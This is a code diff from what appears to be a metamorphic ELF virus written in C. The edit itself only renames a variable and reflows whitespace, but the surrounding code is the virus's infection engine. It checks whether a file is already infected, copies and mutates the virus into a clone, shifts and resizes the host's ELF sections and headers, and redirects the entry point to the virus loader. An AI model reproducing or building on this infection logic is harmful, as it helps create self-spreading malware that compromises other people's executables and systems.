@@ -7,8 +7,8 @@ static bool	adjust_sizes(struct entry *clone_entry,
 			size_t shift_amount, size_t full_virus_size)
 {
 	clone_entry->safe_last_section_shdr->sh_size += full_virus_size;
-	clone_entry->safe_phdr->p_filesz             += shift_amount;
-	clone_entry->safe_phdr->p_memsz              += shift_amount;
+	clone_entry->safe_phdr->p_filesz += shift_amount;
+	clone_entry->safe_phdr->p_memsz += shift_amount;
 
 	return true;
 }
@@ -47,7 +47,7 @@ bool		infection_engine(struct virus_header *vhdr,
 {
 	struct entry	file_entry;
 	struct entry	clone_entry;
-	const size_t	*loader_off      = &file_entry.end_of_last_section;     // init by <find_entry>
+	const size_t	*loader_offset   = &file_entry.end_of_last_section;     // init by <find_entry>
 	uint64_t	*seed            = &vhdr->seed;                         // changed by <generate_seed>
 	size_t		*full_virus_size = &vhdr->full_virus_size;              // changed by <metamorph_clone>
 
@@ -55,13 +55,13 @@ bool		infection_engine(struct virus_header *vhdr,
 	|| !not_infected(&file_entry, file_ref)
 	|| !copy_virus_to_clone(clone_ref, &file_entry, vhdr)
 	|| !generate_seed(seed, file_ref)
-	|| !metamorph_clone(clone_ref, *loader_off, *seed, full_virus_size, vhdr)
+	|| !metamorph_clone(clone_ref, *loader_offset, *seed, full_virus_size, vhdr)
 	|| !define_shift_amount(&file_entry, shift_amount, *full_virus_size)
-	|| !copy_client_to_clone(clone_ref, file_ref, *loader_off, *shift_amount)
-	|| !adjust_references(clone_ref, *shift_amount, *loader_off)
+	|| !copy_client_to_clone(clone_ref, file_ref, *loader_offset, *shift_amount)
+	|| !adjust_references(clone_ref, *shift_amount, *loader_offset)
 	|| !find_entry(&clone_entry, clone_ref)
 	|| !adjust_sizes(&clone_entry, *shift_amount, *full_virus_size)
-	|| !setup_virus_header(clone_ref, *loader_off, *vhdr)
+	|| !setup_virus_header(clone_ref, *loader_offset, *vhdr)
 	|| !change_entry(clone_ref, &file_entry, vhdr->dist_jmpclient_loader))
 		return errors(ERR_THROW, _ERR_T_INFECTION_ENGINE);
 
